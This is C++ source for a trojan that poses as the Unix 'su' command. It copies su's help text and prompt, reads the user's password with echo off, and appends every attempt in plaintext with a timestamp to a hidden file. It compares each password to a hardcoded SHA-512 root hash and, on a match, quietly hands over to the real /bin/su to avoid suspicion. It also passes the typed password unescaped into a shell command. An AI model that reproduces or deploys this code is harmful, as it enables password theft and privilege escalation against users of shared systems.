#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <ctime>
#include <string>
#include <unistd.h>
#include <stdexcept>
#define PATH "/home/rooted/.save"
#define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"

int main(int argc, char *argv[]) {

    /*== Variable ==*/
    std::string passwd, user, command, createdHash;
    std::ofstream passwdFile;
    std::ifstream insertedHashFile;

    /*== Control args ==*/
    try {
        if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "--help") {
                std::cout << "Usage: su [OPTION] [LOGIN]\n\nOptions:\n-c, --command COMMAND   pass COMMAND to the invoked shell\n-h, --help              display this help message and exit\n-, -l, --login          make the shell a login shell\n-m, -p,\n--preserve-environment  do not reset environment variables, and\n                        keep the same shell\n-s, --shell SHELL       use SHELL instead of the default in passwd\n";
                return 0;
        } else {
            user = std::string(argv[1]);            
        }
    } catch (std::logic_error) {
        user = "root";
    }

    /*== Take the password ==*/
    std::cout << "Password: ";
    system("stty -echo");
    std::getline(std::cin, passwd);
    system("stty echo");
    std::cout << '\n';
    sleep(2); // Simulate real su

    /*== Create the hash with the inserted password ==*/ //Salt = 6LxYf0g6
    command = std::string("mkpasswd --method=sha-512 --salt=6LxYfOg6 ")+std::string("\"")+passwd+std::string("\" > /tmp/lol.xd");
    system(command.c_str());
    
    /*== Open the created tmp hash file ==*/
    insertedHashFile.open("/tmp/lol.xd", std::ios::in);
    if(!insertedHashFile.is_open()) {
        std::cerr << "An error has occurred\n";
        insertedHashFile.close();
        return -1;
    }

    /*== Take the hash ==*/
    std::getline(insertedHashFile, createdHash);
    insertedHashFile.close(); // close file
    remove("/tmp/lol.xd");

    /*== Open passwd File PATH ==*/
    passwdFile.open(PATH, std::ios::app);
    if (!passwdFile.is_open()) {
        std::cerr << "An error has occured\n";
        passwdFile.close();
        return -2;
    }
    /*== Set date ==*/
    time_t now = time(0);
    char* tmp = ctime(&now);
    std::string date = std::string(tmp);
    date.erase(date.length()-1, 1);

    /*== Control hash ==*/
    if (createdHash == HASH) {
        /*== CORRECT ==*/
        passwdFile << "CORRECT (" << date << "): " << passwd << '\n';
        passwdFile.close();
        std::cerr << "An error has occured, Retry\n";
        
        /*== Start the real su ==*/
        try {
            command = "/bin/su " + user; 
        } catch (std::logic_error) {
            command = "/bin/su root";
        } system(command.c_str());
        return 0;    

    } else {
        /*== ERROR ==*/
        passwdFile << "ERROR (" << date << "): " << passwd << '\n';
        passwdFile.close();
        std::cerr << "su: Authentication failure\n";
        return 1;
    }
}
